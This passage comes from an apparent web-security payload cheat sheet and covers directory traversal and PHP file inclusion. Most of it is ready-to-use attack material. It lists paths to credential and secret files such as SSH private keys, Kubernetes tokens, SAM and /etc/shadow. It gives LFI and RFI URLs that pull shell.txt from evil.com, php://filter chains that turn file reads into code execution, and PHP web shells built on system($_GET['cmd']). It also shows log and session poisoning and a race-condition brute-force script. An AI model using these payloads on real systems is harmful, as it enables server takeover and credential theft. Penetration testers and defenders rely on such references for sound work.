filedescriptor)\n/proc/self/environ\n/proc/version\n/proc/cmdline\n/proc/sched_debug\n/proc/mounts\n/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/self/cwd/index.php\n/proc/self/cwd/main.py\n/home/$USER/.bash_history\n/home/$USER/.ssh/id_rsa\n/run/secrets/kubernetes.io/serviceaccount/token\n/run/secrets/kubernetes.io/serviceaccount/namespace\n/run/secrets/kubernetes.io/serviceaccount/certificate\n/var/run/secrets/kubernetes.io/serviceaccount\n/var/lib/mlocate/mlocate.db\n/var/lib/mlocate.db\n</code></pre>"},{"location":"Directory%20Traversal/#interesting-windows-files","title":"Interesting Windows files","text":"<p>Always existing file in recent Windows machine.  Ideal to test path traversal but nothing much interesting inside...</p> <pre><code>c:\\windows\\system32\\license.rtf\nc:\\windows\\system32\\eula.txt\n</code></pre> <p>Interesting files to check out (Extracted from https://github.com/soffensive/windowsblindread)</p> <pre><code>c:/boot.ini\nc:/inetpub/logs/logfiles\nc:/inetpub/wwwroot/global.asa\nc:/inetpub/wwwroot/index.asp\nc:/inetpub/wwwroot/web.config\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system32/inetsrv/metabase.xml\nc:/sysprep.inf\nc:/sysprep.xml\nc:/sysprep/sysprep.inf\nc:/sysprep/sysprep.xml\nc:/system volume information/wpsettings.dat\nc:/system32/inetsrv/metabase.xml\nc:/unattend.txt\nc:/unattend.xml\nc:/unattended.txt\nc:/unattended.xml\nc:/windows/repair/sam\nc:/windows/repair/system\n</code></pre> <p>The following log files are controllable and can be included with an evil payload to achieve a command execution</p> <pre><code>/var/log/apache/access.log\n/var/log/apache/error.log\n/var/log/httpd/error_log\n/usr/local/apache/log/error_log\n/usr/local/apache2/log/error_log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/var/log/vsftpd.log\n/var/log/sshd.log\n/var/log/mail\n</code></pre>"},{"location":"Directory%20Traversal/#labs","title":"Labs","text":"<ul> <li>File path traversal, simple case</li> <li>File path traversal, traversal sequences blocked with absolute path bypass</li> <li>File path traversal, traversal sequences stripped non-recursively</li> <li>File path traversal, traversal sequences stripped with superfluous URL-decode</li> <li>File path traversal, validation of start of path</li> <li>File path traversal, validation of file extension with null byte bypass</li> </ul>"},{"location":"Directory%20Traversal/#references","title":"References","text":"<ul> <li>Path Traversal Cheat Sheet: Windows</li> <li>Directory traversal attack - Wikipedia</li> <li>CWE-40: Path Traversal: '\\UNC\\share\\name\\' (Windows UNC Share) - CWE Mitre - December 27, 2018</li> <li>NGINX may be protecting your applications from traversal attacks without you even knowing</li> <li>Directory traversal - Portswigger</li> </ul>"},{"location":"File%20Inclusion/","title":"File Inclusion","text":"<p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application.</p> <p>The Path Traversal vulnerability allows an attacker to access a file, usually exploiting a \"reading\" mechanism implemented in the target application</p>"},{"location":"File%20Inclusion/#summary","title":"Summary","text":"<ul> <li>File Inclusion</li> <li>Summary</li> <li>Tools</li> <li>Basic LFI<ul> <li>Null byte</li> <li>Double encoding</li> <li>UTF-8 encoding</li> <li>Path and dot truncation</li> <li>Filter bypass tricks</li> </ul> </li> <li>Basic RFI<ul> <li>Null byte</li> <li>Double encoding</li> <li>Bypass allow_url_include</li> </ul> </li> <li>LFI / RFI using wrappers<ul> <li>Wrapper php://filter</li> <li>Wrapper zip://</li> <li>Wrapper data://</li> <li>Wrapper expect://</li> <li>Wrapper input://</li> <li>Wrapper phar://</li> </ul> </li> <li>LFI to RCE via /proc/*/fd</li> <li>LFI to RCE via /proc/self/environ</li> <li>LFI to RCE via upload</li> <li>LFI to RCE via upload (race)</li> <li>LFI to RCE via upload (FindFirstFile)</li> <li>LFI to RCE via phpinfo()</li> <li>LFI to RCE via controlled log file<ul> <li>RCE via SSH</li> <li>RCE via Mail</li> <li>RCE via Apache logs</li> </ul> </li> <li>LFI to RCE via PHP sessions</li> <li>LFI to RCE via credentials files<ul> <li>Windows version</li> <li>Linux version</li> </ul> </li> <li>References</li> </ul>"},{"location":"File%20Inclusion/#tools","title":"Tools","text":"<ul> <li>Kadimus - https://github.com/P0cL4bs/Kadimus</li> <li>LFISuite - https://github.com/D35m0nd142/LFISuite</li> <li>fimap - https://github.com/kurobeats/fimap</li> <li>panoptic - https://github.com/lightos/Panoptic</li> </ul>"},{"location":"File%20Inclusion/#basic-lfi","title":"Basic LFI","text":"<p>In the following examples we include the <code>/etc/passwd</code> file, check the <code>Directory &amp; Path Traversal</code> chapter for more interesting files.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd\n</code></pre>"},{"location":"File%20Inclusion/#null-byte","title":"Null byte","text":"<p> In versions of PHP below 5.3.4 we can terminate with null byte.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd%00\n</code></pre>"},{"location":"File%20Inclusion/#double-encoding","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00\n</code></pre>"},{"location":"File%20Inclusion/#utf-8-encoding","title":"UTF-8 encoding","text":"<pre><code>http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\nhttp://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00\n</code></pre>"},{"location":"File%20Inclusion/#path-and-dot-truncation","title":"Path and dot truncation","text":"<p>On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] \nhttp://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd\n</code></pre>"},{"location":"File%20Inclusion/#filter-bypass-tricks","title":"Filter bypass tricks","text":"<pre><code>http://example.com/index.php?page=....//....//etc/passwd\nhttp://example.com/index.php?page=..///////..////..//////etc/passwd\nhttp://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd\n</code></pre>"},{"location":"File%20Inclusion/#basic-rfi","title":"Basic RFI","text":"<p>Most of the filter bypasses from LFI section can be reused for RFI.</p> <pre><code>http://example.com/index.php?page=http://evil.com/shell.txt\n</code></pre>"},{"location":"File%20Inclusion/#null-byte_1","title":"Null byte","text":"<pre><code>http://example.com/index.php?page=http://evil.com/shell.txt%00\n</code></pre>"},{"location":"File%20Inclusion/#double-encoding_1","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt\n</code></pre>"},{"location":"File%20Inclusion/#bypass-allow_url_include","title":"Bypass allow_url_include","text":"<p>When <code>allow_url_include</code> and <code>allow_url_fopen</code> are set to <code>Off</code>. It is still possible to include a remote file on Windows box using the <code>smb</code> protocol.</p> <ol> <li>Create a share open to everyone</li> <li>Write a PHP code inside a file : <code>shell.php</code></li> <li>Include it <code>http://example.com/index.php?page=\\\\10.0.0.1\\share\\shell.php</code></li> </ol>"},{"location":"File%20Inclusion/#lfi-rfi-using-wrappers","title":"LFI / RFI using wrappers","text":""},{"location":"File%20Inclusion/#wrapper-phpfilter","title":"Wrapper php://filter","text":"<p>The part \"<code>php://filter</code>\" is case insensitive</p> <pre><code>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre> <p>Wrappers can be chained with a compression wrapper for large files.</p> <pre><code>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n</code></pre> <p>NOTE: Wrappers can be chained multiple times using <code>|</code> or <code>/</code>:  - Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code> - deflate then <code>base64encode</code> (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></p> <pre><code>./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter page \ncurl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d &gt; index.php\n</code></pre> <p>Also there is a way to turn the <code>php://filter</code> into a full RCE. </p> <ul> <li>synacktiv/php_filter_chain_generator - A CLI to generate PHP filters chain   <pre><code>$ python3 php_filter_chain_generator.py --chain '&lt;?php phpinfo();?&gt;'\n[+] The following gadget chain will generate the following code : &lt;?php phpinfo();?&gt; (base64 value: PD9waHAgcGhwaW5mbygpOz8+)\nphp://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n</code></pre></li> <li>LFI2RCE.py to generate a custom payload.   <pre><code># vulnerable file: index.php\n# vulnerable parameter: file\n# executed command: id\n# executed PHP code: &lt;?=`$_GET[0]`;;?&gt;\ncurl \"127.0.0.1:8000/index.php?0=id&amp;file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\"\n</code></pre></li> </ul>"},{"location":"File%20Inclusion/#wrapper-zip","title":"Wrapper zip://","text":"<ol> <li>Create an evil payload: <code>echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;\" &gt; payload.php;</code></li> <li>Zip the file   <pre><code>zip payload.zip payload.php;\nmv payload.zip shell.jpg;\nrm payload.php\n</code></pre></li> <li>Upload the archive and access the file using the wrappers: http://example.com/index.php?page=zip://shell.jpg%23payload.php</li> </ol>"},{"location":"File%20Inclusion/#wrapper-data","title":"Wrapper data://","text":"<pre><code>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nNOTE: the payload is \"&lt;?php system($_GET['cmd']);echo 'Shell done !'; ?&gt;\"\n</code></pre> <p>Fun fact: you can trigger an XSS and bypass the Chrome Auditor with : <code>http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+</code></p>"},{"location":"File%20Inclusion/#wrapper-expect","title":"Wrapper expect://","text":"<pre><code>http://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls\n</code></pre>"},{"location":"File%20Inclusion/#wrapper-input","title":"Wrapper input://","text":"<p>Specify your payload in the POST parameters, this can be done with a simple <code>curl</code> command.</p> <pre><code>curl -X POST --data \"&lt;?php echo shell_exec('id'); ?&gt;\" \"https://example.com/index.php?page=php://input%00\" -k -v\n</code></pre> <p>Alternatively, Kadimus has a module to automate this attack.</p> <pre><code>./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '&lt;?php echo shell_exec(\"id\"); ?&gt;' -T input\n</code></pre>"},{"location":"File%20Inclusion/#wrapper-phar","title":"Wrapper phar://","text":"<p>Create a phar file with a serialized object in its meta-data.</p> <pre><code>// create new Phar\n$phar = new Phar('test.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('test.txt', 'text');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');\n// add object of any class as meta data\nclass AnyClass {}\n$object = new AnyClass;\n$object-&gt;data = 'rips';\n$phar-&gt;setMetadata($object);\n$phar-&gt;stopBuffering();\n</code></pre> <p>If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked</p> <pre><code>class AnyClass {\n    function __destruct() {\n        echo $this-&gt;data;\n    }\n}\n// output: rips\ninclude('phar://test.phar');\n</code></pre> <p>NOTE: The unserialize is triggered for the phar:// wrapper in any file operation, <code>file_exists</code> and many more.</p>"},{"location":"File%20Inclusion/#lfi-to-rce-via-procfd","title":"LFI to RCE via /proc/*/fd","text":"<ol> <li>Upload a lot of shells (for example : 100)</li> <li>Include http://example.com/index.php?page=/proc/$PID/fd/$FD, with $PID = PID of the process (can be bruteforced) and $FD the filedescriptor (can be bruteforced too)</li> </ol>"},{"location":"File%20Inclusion/#lfi-to-rce-via-procselfenviron","title":"LFI to RCE via /proc/self/environ","text":"<p>Like a log file, send the payload in the User-Agent, it will be reflected inside the /proc/self/environ file</p> <pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: &lt;?=phpinfo(); ?&gt;\n</code></pre>"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload","title":"LFI to RCE via upload","text":"<p>If you can upload a file, just inject the shell payload in it (e.g : <code>&lt;?php system($_GET['c']); ?&gt;</code> ).</p> <pre><code>http://example.com/index.php?page=path/to/uploaded/file.png\n</code></pre> <p>In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf</p>"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload-race","title":"LFI to RCE via upload (race)","text":"<p>Worlds Quitest Let's Play\" * Upload a file and trigger a self-inclusion. * Repeat 1 a shitload of time to: * increase our odds of winning the race * increase our guessing odds * Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6} * Enjoy our shell.</p> <pre><code>import itertools\nimport requests\nimport sys\nprint('[+] Trying to win the race')\nf = {'file': open('shell.php', 'rb')}\nfor _ in range(4096 * 4096):\nrequests.post('http://target.com/index.php?c=index.php', f)\nprint('[+] Bruteforcing the inclusion')\nfor fname in itertools.combinations(string.ascii_letters + string.digits, 6):\nurl = 'http://target.com/index.php?c=/tmp/php' + fname\nr = requests.get(url)\nif 'load average' in r.text:  # &lt;?php echo system('uptime');\nprint('[+] We have got a shell: ' + url)\nsys.exit(0)\nprint('[x] Something went wrong, please try again')\n</code></pre>"},{"location":"File%20Inclusion/#lfi-to-rce-via-upload-findfirstfile","title":"LFI to RCE via upload (FindFirstFile)","text":"<p> Only works on Windows</p> <p><code>FindFirstFile</code> allows using masks (<code>&lt;&lt;</code> as <code>*</code> and <code>&gt;</code> as <code>?</code>) in LFI paths on Windows. </p> <ul> <li>Upload a file, it should be stored in the temp folder <code>C:\\Windows\\Temp\\</code>.</li> <li>Include it using <code>http://site/vuln.php?inc=c:\\windows\\temp\\php&lt;&lt;</code></li> </ul>"},{"location":"File%20Inclusion/#lfi-to-rce-via-phpinfo","title":"LFI to RCE via phpinfo()","text":"<p>PHPinfo() displays the content of any variables such as $_GET, $_POST and $_FILES.</p> <p>By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.</p> <p>Use the script phpInfoLFI.py (also available at https://www.insomniasec.com/downloads/publications/phpinfolfi.py)</p> <p>Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</p>"},{"location":"File%20Inclusion/#lfi-to-rce-via-controlled-log-file","title":"LFI to RCE via controlled log file","text":"<p>Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.</p> <pre><code>http://example.com/index.php?page=/var/log/apache/access.log\nhttp://example.com/index.php?page=/var/log/apache/error.log\nhttp://example.com/index.php?page=/var/log/apache2/access.log\nhttp://example.com/index.php?page=/var/log/apache2/error.log\nhttp://example.com/index.php?page=/var/log/nginx/access.log\nhttp://example.com/index.php?page=/var/log/nginx/error.log\nhttp://example.com/index.php?page=/var/log/vsftpd.log\nhttp://example.com/index.php?page=/var/log/sshd.log\nhttp://example.com/index.php?page=/var/log/mail\nhttp://example.com/index.php?page=/var/log/httpd/error_log\nhttp://example.com/index.php?page=/usr/local/apache/log/error_log\nhttp://example.com/index.php?page=/usr/local/apache2/log/error_log\n</code></pre>"},{"location":"File%20Inclusion/#rce-via-ssh","title":"RCE via SSH","text":"<p>Try to ssh into the box with a PHP code as username <code>&lt;?php system($_GET[\"cmd\"]);?&gt;</code>.</p> <pre><code>ssh &lt;?php system($_GET[\"cmd\"]);?&gt;@10.10.10.10\n</code></pre> <p>Then include the SSH log files inside the Web Application.</p> <pre><code>http://example.com/index.php?page=/var/log/auth.log&amp;cmd=id\n</code></pre>"},{"location":"File%20Inclusion/#rce-via-mail","title":"RCE via Mail","text":"<p>First send an email using the open SMTP then include the log file located at <code>http://example.com/index.php?page=/var/log/mail</code>.</p> <pre><code>root@kali:~# telnet 10.10.10.10. 25\nTrying 10.10.10.10....\nConnected to 10.10.10.10..\nEscape character is '^]'.\n220 straylight ESMTP Postfix (Debian/GNU)\nhelo ok\n250 straylight\nmail from: mail@example.com\n250 2.1.0 Ok\nrcpt to: root\n250 2.1.5 Ok\ndata\n354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\nsubject: &lt;?php echo system($_GET[\"cmd\"]); ?&gt;\ndata2\n.\n</code></pre> <p>In some cases you can also send the email with the <code>mail</code> command line.</p> <pre><code>mail -s \"&lt;?php system($_GET['cmd']);?&gt;\" www-data@10.10.10.10. &lt; /dev/null\n</code></pre>"},{"location":"File%20Inclusion/#rce-via-apache-logs","title":"RCE via Apache logs","text":"<p>Poison the User-Agent in access logs:</p> <pre><code>$ curl http://example.org/ -A \"&lt;?php system(\\$_GET['cmd']);?&gt;\"\n</code></pre> <p>Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.</p> <p>Then request the logs via the LFI and execute your command.</p> <pre><code>$ curl http://example.org/test.php?page=/var/log/apache2/access.log&amp;cmd=id\n</code></pre>"},{"location":"File%20Inclusion/#lfi-to-rce-via-php-sessions","title":"LFI to RCE via PHP sessions","text":"<p>Check if the website use PHP Session (PHPSESSID)</p> <pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\n</code></pre> <p>In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/session/sess_[PHPSESSID] files</p> <pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\n</code></pre> <p>Set the cookie to <code>&lt;?php system('cat /etc/passwd');?&gt;</code></p> <pre><code>login=1&amp;user=&lt;?php system(\"cat /etc/passwd\");?&gt;&amp;pass=password&amp;lang=en_us.php\n</code></pre> <p>Use the LFI to include the PHP session file</p> <pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27\n</code></pre>"},{"location":"File%20Inclusion/#lfi-to-rce-via-credentials-files","title":"LFI to RCE via credentials files","text":"<p>This method require high privileges inside the application in order to read the sensitive files.</p>"},{"location":"File%20Inclusion/#windows-version","title":"Windows version","text":"<p>First extract <code>sam</code> and <code>system</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam\nhttp://example.com/index.php?page=../../../../../../WINDOWS/repair/system\n</code></pre> <p>Then extract hashes from these files <code>samdump2 SYSTEM SAM &gt; hashes.txt</code>, and crack them with <code>hashcat/john</code> or replay them using the Pass The Hash technique.</p>"},{"location":"File%20Inclusion/#linux-version","title":"Linux version","text":"<p>First extract <code>/etc/shadow</code> files.</p> <pre><code>http://example.com/index.php?page=../../../../../../etc/shadow\n</code></pre> <p>Then crack the hashes inside in order to login via SSH on the machine.</p> <p>Another way to gain SSH access to a Linux machine through LFI is by reading the private key file, id_rsa. If SSH is active check which user is being used <code>/proc/self/status</code> and <code>/etc/passwd</code> and try to access <code>/&lt;HOME&gt;/.ssh/id_rsa</code>.</p>"},{"location":"File%20Inclusion/#references","title":"References","text":"<ul> <li>OWASP LFI</li> <li>HighOn.coffee LFI Cheat</li> <li>Turning LFI to RFI</li> <li>Is PHP vulnerable and under what conditions?</li> <li>Upgrade from LFI to RCE via PHP Sessions</li> <li>Local file inclusion tricks</li> <li>CVV #1: Local File Inclusion - SI9INT</li> <li>Exploiting Blind File Reads / Path 